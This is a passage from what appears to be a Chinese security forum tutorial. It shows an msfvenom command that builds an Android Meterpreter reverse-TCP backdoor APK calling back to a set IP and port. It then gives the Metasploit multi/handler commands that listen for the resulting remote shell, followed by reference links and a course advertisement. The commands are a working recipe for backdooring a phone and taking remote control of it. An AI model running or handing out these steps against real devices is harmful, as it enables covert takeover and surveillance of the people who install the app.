
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.73.131 LPORT=5555 R > /root/Linux/backdoor.apk
```

![](https://bbs.kanxue.com/upload/attach/201910/828426_CM3HCN6CXTE9RKF.png)

## 2.配置`Metasploit`，`exploit`监听

```
search exploit/hanler  // (exploit/multi/handler：通用有效负载处理程序)

use exploit/multi/handler        // 使用模块

show options         // 配置

set LHOST 192.168.73.131

set LPORT 5555

set payload android/meterpreter/reverse_tcp         // 设置测试的载荷

exploit            // 监听
```

![](https://bbs.kanxue.com/upload/attach/201910/828426_DHZ5HYCW27Z9KYP.png)

### ☛参考文档

- `626K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8W2c8S2K9r3W2J5i4K6g2X3x3e0p5I4i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5^5x3U0x3^5z5e0f1%4x3l9`.`.

- `e18K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8Y4c8Z5M7X3g2S2k6q4)9J5k6o6t1H3x3e0x3%4i4K6u0V1x3g2)9J5k6o6q4Q4x3X3g2Z5N6r3#2D9`

- [Metasploit后门渗透Linux系统以及跨平台后门生成.md](https://bbs.kanxue.com/elink@565K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6F1L8%4c8W2i4K6u0W2N6$3W2*7i4K6u0W2j5$3&6Q4x3V1k6%4k6h3u0Q4x3V1k6%4k6h3u0Q4x3@1k6V1j5#2)9K6c8o6l9$3k6U0y4U0x3U0p5@1i4K6u0V1j5K6R3$3x3g2)9J5k6o6c8S2k6h3c8Q4x3X3c8T1k6e0q4X3i4K6u0V1x3X3u0U0y4o6k6V1j5e0f1@1x3o6m8U0i4K6t1$3j5h3#2H3i4K6y4n7K9$3u0Q4x3@1c8Q4x3U0k6S2L8i4m8Q4x3@1u0U0L8h3c8Q4x3@1c8C8L8g2)9J5y4e0u0o6)

### ☛2019-08-28 14:27:50 星期三

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2019-10-12 09:54

被Lǎn māo编辑，原因：
